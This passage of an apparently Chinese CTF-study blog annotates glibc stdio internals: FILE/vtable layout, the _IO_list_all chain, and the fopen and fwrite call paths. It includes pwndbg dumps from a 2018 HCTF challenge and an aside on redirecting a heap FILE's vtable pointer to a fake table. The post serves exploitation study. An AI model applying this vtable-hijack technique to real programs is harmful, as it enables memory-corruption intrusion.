<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_IO_XSGETN(FP, DATA, N) </span><br><span class="line">= JUMP2 (__xsgetn, FP, DATA, N)</span><br><span class="line">= (_IO_JUMPS_FUNC(FP)-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (_IO_JUMPS_FILE_plus (FP))-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (_IO_CAST_FIELD_ACCESS ((FP), struct _IO_FILE_plus, vtable))-&gt;__xsgetn) (FP, DATA, N)</span><br><span class="line">= (IO_validate_vtable (FP-&gt;vtable)[__xsgetn] ) (FP, DATA, N)</span><br><span class="line"></span><br><span class="line">IO_validate_vtable接受一个vtable指针,原封不动地返回,只对这个vtable做一些校验</span><br><span class="line">=(FP-&gt;vtable)[__xsgetn](FP, DATA, N)</span><br><span class="line"></span><br><span class="line">__xsgetn可以理解为偏移量或者枚举值</span><br><span class="line">fp的vtable表中偏移量为__xsgetn处就是_IO_file_xsgetn</span><br><span class="line">=_IO_file_xsgetn (FP, DATA, N)</span><br></pre></td></tr></table></figure>





<blockquote>
<p>还有一种思路是保持真表不变,但是篡改真表上的函数指针</p>
<p>但是前提是真表所在的内存区块可写</p>
<p>然而事实上不可写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all.vtable</span><br><span class="line">$5 = (const struct _IO_jump_t *) 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">pwndbg&gt; info target</span><br><span class="line">	...</span><br><span class="line">	0x00007ffff7dcd900 - 0x00007ffff7dd0ba0 is .data.rel.ro in /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">	...</span><br><span class="line">pwndbg&gt; lm</span><br><span class="line">	...</span><br><span class="line"> 0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so</span><br><span class="line"> ...</span><br></pre></td></tr></table></figure>

<p>只可读</p>
<p>因此只能考虑当<code>_IO_list_all</code>位于堆区时,修改其vtable指针指向假表</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$25 = (struct _IO_FILE_plus *) 0x602010</span><br><span class="line">pwndbg&gt; p *_IO_list_all</span><br><span class="line">$26 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539000,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 3,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x6020f0,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x602100,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x/30gx file</span><br><span class="line">0x602010:       0x00000000fbad2488      0x0000000000000000</span><br><span class="line">0x602020:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602050:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602060:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602070:       0x0000000000000000      0x00007ffff7dd2540</span><br><span class="line">0x602080:       0x0000000000000003      0x0000000000000000</span><br><span class="line">0x602090:       0x0000000000000000      0x00000000006020f0</span><br><span class="line">0x6020a0:       0xffffffffffffffff      0x0000000000000000</span><br><span class="line">0x6020b0:       0x0000000000602100      0x0000000000000000</span><br><span class="line">0x6020c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020d0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020e0:       0x0000000000000000      0x00007ffff7dd06e0	//此处为vtable指针</span><br><span class="line">0x6020f0:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; lm</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">          0x400000           0x401000 r-xp     1000 0      /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x600000           0x601000 r--p     1000 0      /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x601000           0x602000 rw-p     1000 1000   /home/dustball/2018_hctf_the_end/main</span><br><span class="line">          0x602000           0x623000 rw-p    21000 0      [heap]</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">subgraph stack[&quot;stack&quot;]</span><br><span class="line"></span><br><span class="line">	subgraph main [&quot;main frame&quot;]</span><br><span class="line">		filepointer[&quot;FILE* file&quot;]</span><br><span class="line">		style filepointer fill:RED</span><br><span class="line">	end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">subgraph glibcdata [&quot;glibc memory&quot;]</span><br><span class="line">	subgraph table [&quot;_IO_file_jumps&quot;]</span><br><span class="line">			__xsputn[&quot;__xsputn&quot;]</span><br><span class="line">			__xsgetn[&quot;__xsgetn&quot;]</span><br><span class="line">			etc[&quot;...&quot;]</span><br><span class="line">			style __xsputn fill:RED</span><br><span class="line">			style __xsgetn fill:RED</span><br><span class="line">			style etc fill:RED</span><br><span class="line">	end</span><br><span class="line">	style table fill:GREEN</span><br><span class="line">	</span><br><span class="line">	xsputn[&quot;_IO_new_file_xsputn&quot;]</span><br><span class="line">  	xsgetn[&quot;__GI__IO_file_xsgetn&quot;]</span><br><span class="line">  	style xsputn fill:YELLOW</span><br><span class="line">  	style xsgetn fill:YELLOW</span><br><span class="line">  	</span><br><span class="line">  	subgraph plus1[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stderr[&quot;struct FILE stderr&quot;]</span><br><span class="line">  		vtable1[&quot;vtable&quot;]</span><br><span class="line">  		</span><br><span class="line">  	end</span><br><span class="line">  	  subgraph plus2[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stdout[&quot;struct FILE stdout&quot;]</span><br><span class="line">  		vtable2[&quot;vtable&quot;]</span><br><span class="line">  	end</span><br><span class="line">  	  subgraph plus3[&quot;_IO_FILE_plus&quot;]</span><br><span class="line">  		stdin[&quot;struct FILE stdin&quot;]</span><br><span class="line">  		vtable3[&quot;vtable&quot;]</span><br><span class="line">  	end</span><br><span class="line">  	</span><br><span class="line">  	listhead[&quot;_IO_list_all&quot;]</span><br><span class="line">  	style listhead fill:RED</span><br><span class="line">  	</span><br><span class="line">  	</span><br><span class="line">  	</span><br><span class="line">  	style vtable1 fill:RED</span><br><span class="line">  	style vtable2 fill:RED</span><br><span class="line">  	style vtable3 fill:RED</span><br><span class="line">  	style stderr fill:GREEN</span><br><span class="line">	style stdout fill:GREEN</span><br><span class="line">	style stdin fill:GREEN</span><br><span class="line">	style plus1 fill:GREEN</span><br><span class="line">	style plus2 fill:GREEN</span><br><span class="line">	style plus3 fill:GREEN</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">subgraph heap [&quot;heap&quot;]</span><br><span class="line">	subgraph plus [&quot;_IO_FILE_plus&quot;]</span><br><span class="line">		file[&quot;struct FILE file&quot;]</span><br><span class="line">		vtable[&quot;vtable&quot;]	</span><br><span class="line">		style file fill:GREEN</span><br><span class="line">		style vtable fill:RED</span><br><span class="line">	end	</span><br><span class="line">	style plus fill:GREEN</span><br><span class="line">	</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filepointer--&gt;file</span><br><span class="line">vtable----&gt;table</span><br><span class="line"></span><br><span class="line">file--chain--&gt;stderr--chain--&gt;stdout--chain--&gt;stdin--chain--&gt;null</span><br><span class="line">  	__xsputn--&gt;xsputn</span><br><span class="line">  	__xsgetn--&gt;xsgetn</span><br><span class="line">listhead--&gt;plus1</span><br><span class="line">  </span><br><span class="line">subgraph example [&quot;图例&quot;]</span><br><span class="line">	function[&quot;函数&quot;]</span><br><span class="line">	style function fill:YELLOW</span><br><span class="line">	struct[&quot;对象&quot;]</span><br><span class="line">	style struct fill:GREEN</span><br><span class="line">	pointer[&quot;指针&quot;]</span><br><span class="line">	style pointer fill:RED</span><br><span class="line">end</span><br><span class="line">style example fill:GRAY</span><br></pre></td></tr></table></figure>

<p><strong>综上,fopen的作用是,创建一个新的<code>_IO_FILE_plus</code>结构体(包括FILE和vtable两部分)并初始化之,然后头插法将其链接到<code>_IO_list_all</code>链表上</strong></p>
<h3 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *ptr, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *stream)</span></span><br></pre></td></tr></table></figure>

<p>把 <strong>ptr</strong> 所指向的数组中的数据写入到给定流 <strong>stream</strong> 中。</p>
<p>写入<code>size</code>大小的单位<code>nmemb</code>个</p>
<p>实际上调用跳转表函数<code>vtable.__xsputn</code></p>
<p>整个调用过程链</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">flowchart TB</span><br><span class="line">fwrite[fwrite]</span><br><span class="line">_IO_fwrite[_IO_fwrite @ glibc-2.38/libio/iofwrite.c:32]</span><br><span class="line">_IO_file_xsputn[_IO_new_file_xsputn @ glibc-2.38/libio/fileops.c:1197]</span><br><span class="line">_IO_file_overflow[</span><br><span class="line">	_IO_new_file_overflow @ glibc-2.38/libio/fileops.c:733</span><br><span class="line">	也会调用_IO_do_write将现有的缓冲区写入文件</span><br><span class="line">	然后缓冲区指针复位</span><br><span class="line">]</span><br><span class="line">_IO_do_write[_IO_new_do_write @ glibc-2.38/libio/fileops.c:425]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new_do_write[</span><br><span class="line">	new_do_write @ glibc-2.38/libio/fileops.c:431</span><br><span class="line">	read缓冲区三个指针全等于_IO_buf_base</span><br><span class="line">	write缓冲区base和ptr指向_IO_buf_base, end指针指向</span><br><span class="line">]</span><br><span class="line">write[&quot;__write(f-&gt;_fileno,data,to_do)&quot;]</span><br><span class="line"></span><br><span class="line">_IO_file_write[_IO_new_file_write @ glibc-2.38/libio/fileops.c:1173]</span><br><span class="line"></span><br><span class="line">fwrite--&quot;_IO_sputn&quot;--&gt;_IO_fwrite</span><br><span class="line">_IO_fwrite--&gt;_IO_file_xsputn</span><br><span class="line">_IO_file_xsputn--&quot;_IO_OVERFLOW&quot;--&gt;_IO_file_overflow</span><br><span class="line">_IO_file_xsputn--&gt;_IO_do_write</span><br><span class="line">_IO_do_write--&gt;new_do_write</span><br><span class="line">new_do_write--&quot;_IO_SYSWRITE&quot;--&gt;_IO_file_write</span><br><span class="line">_IO_file_write--&gt;write</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>









<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fwrite (<span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)<span class="comment">//一个单位size字节,但是实际上还是以字节为单位</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> request = size * count;</span><br><span class="line">  <span class="type">size_t</span> written = <span class="number">0</span>;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);		<span class="comment">//check个寂寞</span></span><br><span class="line">  <span class="keyword">if</span> (request == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span> || _IO_fwide (fp, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">    written = _IO_sputn (fp, (<span class="type">const</span> <span class="type">char</span> *) buf, request);		<span class="comment">//实际上调用_IO_new_file_xsputn</span></span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="comment">/* We have written all of the input in case the return value indicates</span></span><br><span class="line"><span class="comment">     this or EOF is returned.  The latter is a special case where we</span></span><br><span class="line"><span class="comment">     simply did not manage to flush the buffer.  But the data is in the</span></span><br><span class="line"><span class="comment">     buffer and therefore written as far as fwrite is concerned.  */</span></span><br><span class="line">  <span class="keyword">if</span> (written == request || written == EOF)		<span class="comment">//返回实际写入单位数,注意不是字节数</span></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> written / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *s = (<span class="type">const</span> <span class="type">char</span> *) data;		<span class="comment">//数据指针</span></span><br><span class="line">  <span class="type">size_t</span> to_do = n;		<span class="comment">//当前还差多少个没有写入</span></span><br><span class="line">  <span class="type">int</span> must_flush = <span class="number">0</span>;	<span class="comment">//行缓冲强制刷新缓冲区标志</span></span><br><span class="line">  <span class="type">size_t</span> count = <span class="number">0</span>;		<span class="comment">//当前缓冲区剩余空间</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="comment">/* This is an optimized implementation.</span></span><br><span class="line"><span class="comment">     If the amount to be written straddles a block boundary</span></span><br><span class="line"><span class="comment">     (or the filebuf is unbuffered), use sys_write directly. */</span></span><br><span class="line">  	<span class="comment">//如果要写入的大小大于一个块或者filebuf没有缓冲区,那么直接使用系统调用</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment">//如果使用行缓冲 并且 该f文件流目前正在进行写入操作</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_LINE_BUF) &amp;&amp; (f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      count = f-&gt;_IO_buf_end - f-&gt;_IO_write_ptr;<span class="comment">//count表示当前写缓冲区剩余空间</span></span><br><span class="line">      <span class="keyword">if</span> (count &gt;= n)			<span class="comment">//如果剩余空间足够大则直接写入</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="type">const</span> <span class="type">char</span> *p;</span><br><span class="line">	  <span class="keyword">for</span> (p = s + n; p &gt; s; )<span class="comment">//寻找最后一个\n,注意此时并未向缓冲区进行拷贝,只是寻找\n</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">if</span> (*--p == <span class="string">&#x27;\n&#x27;</span>)		<span class="comment">//如果发现有换行符则must_flush置1表示必须刷新缓冲区</span></span><br><span class="line">		&#123;</span><br><span class="line">		  count = p - s + <span class="number">1</span>;</span><br><span class="line">		  must_flush = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//否则如果写缓冲区中还有空间,首先计算一下剩余空间count</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (f-&gt;_IO_write_end &gt; f-&gt;_IO_write_ptr)</span><br><span class="line">    count = f-&gt;_IO_write_end - f-&gt;_IO_write_ptr; <span class="comment">/* Space available. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Then fill the buffer. */</span></span><br><span class="line">  <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (count &gt; to_do)			<span class="comment">//如果剩余写缓冲区够大直接放到写缓冲区</span></span><br><span class="line">	count = to_do;</span><br><span class="line">      f-&gt;_IO_write_ptr = __mempcpy (f-&gt;_IO_write_ptr, s, count);	<span class="comment">//直接从data搬到write_buf中</span></span><br><span class="line">      s += count;</span><br><span class="line">      to_do -= count;<span class="comment">//to_do降为0表明已经写入writebuf了</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//到此已经解决了写入比较少的情况,能够直接放到write_buf中</span></span><br><span class="line">    <span class="comment">//下面还要考虑的业务有:</span></span><br><span class="line">    <span class="comment">//1.行缓冲是否有\n结尾,也就是说must_flush是否置位, 如果是,则需要刷新缓冲区(也就是写入到文件)</span></span><br><span class="line">    <span class="comment">//2.写入量很大,超过了缓冲区剩余数量</span></span><br><span class="line">    	<span class="comment">//2.1首先把现有的缓冲区写入到文件,缓冲区复位,看看能否容纳写入量</span></span><br><span class="line">    	<span class="comment">//2.2如果还容纳不了,则直接syscall</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//如果没开启行缓冲,(也就是must_flush=0),并且写入量比较小已经放到了缓冲区,那么可以返回了,不走下面的业务,直接return</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//对于行缓冲需要刷新缓冲区,或者写入量太大时首先尝试缓冲区复位, 处理方式是一样的,首先都刷新缓冲区</span></span><br><span class="line">    <span class="comment">//接下来判断一下to_do看看还有没有需要写入的,对于已完成的行缓冲情况可以返回了</span></span><br><span class="line">    <span class="comment">//对于写入量大的情况,如果刷新了缓冲区之后,to_do还是大于缓冲区大小,则直接syscall</span></span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)		<span class="comment">//如果还有to_do则表明count&lt;to_do</span></span><br><span class="line">      								<span class="comment">//如果有must_flush说明行缓冲需要刷新缓冲区</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)			<span class="comment">//刷新缓冲区,将缓冲区写入文件,调整文件指针,如果已经到达文件末尾则返回EOF</span></span><br><span class="line">	<span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">	   caller that everything has been written.  */</span></span><br><span class="line">	<span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      <span class="comment">//如果文件写满了,也就是EOF了,如果此时to_do为0,对应已经满足的行缓冲,返回EOF. </span></span><br><span class="line">      <span class="comment">//对于未满足的大量写入,返回已经写入的字节数n-to_do</span></span><br><span class="line">	  </span><br><span class="line">      </span><br><span class="line">	</span><br><span class="line">      <span class="comment">//如果控制流到这儿了,说明起码没有EOF</span></span><br><span class="line">      <span class="comment">//要么是已经刷新了缓冲区的行缓冲情况,要么是未满足的大量写入请求</span></span><br><span class="line">      <span class="comment">/* Try to maintain alignment: write a whole number of blocks.  */</span></span><br><span class="line">      block_size = f-&gt;_IO_buf_end - f-&gt;_IO_buf_base;		<span class="comment">//block_size大小是缓冲区大小</span></span><br><span class="line">      do_write = to_do - (block_size &gt;= <span class="number">128</span> ? to_do % block_size : <span class="number">0</span>);</span><br><span class="line">      <span class="comment">//如果block_size&gt;=128,则do_write = to_do - (to_do % block_size)</span></span><br><span class="line">      <span class="comment">//to_do大小可能是若干个整块最后是一个不满的块,这个不满的块大小就是(to_do % block_size)</span></span><br><span class="line">      <span class="comment">//这样算完之后,do_write就是若干整块 , 不包括最后的不满块</span></span><br><span class="line">    	</span><br><span class="line">	  <span class="comment">//否则block_size太小不足128,此时do_write就是to_do</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_write)					<span class="comment">//如果有do_write,下面就要实际写入了</span></span><br><span class="line">	&#123;</span><br><span class="line">	  count = new_do_write (f, s, do_write);	</span><br><span class="line">	  to_do -= count;			<span class="comment">//此时的to_do可能是不满块剩下的,或者new_do_write没有写完剩下的</span></span><br><span class="line">	  <span class="keyword">if</span> (count &lt; do_write)		<span class="comment">//如果实际上写入的不足do_write,说明new_do_write没有完成任务,要么是EOF,尽力了,返回实际读了多少</span></span><br><span class="line">	    <span class="keyword">return</span> n - to_do;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Now write out the remainder.  Normally, this will fit in the</span></span><br><span class="line"><span class="comment">	 buffer, but it&#x27;s somewhat messier for line-buffered files,</span></span><br><span class="line"><span class="comment">	 so we let _IO_default_xsputn handle the general case. */</span></span><br><span class="line">      <span class="keyword">if</span> (to_do)				<span class="comment">//如果到这里还有to_do,说明是最后那个不满块,</span></span><br><span class="line">	to_do -= _IO_default_xsputn (f, s+do_write, to_do);	</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><code>_IO_OVERFLOW</code>这个宏实际上也是调用vtable[overflow]函数实现的</p>
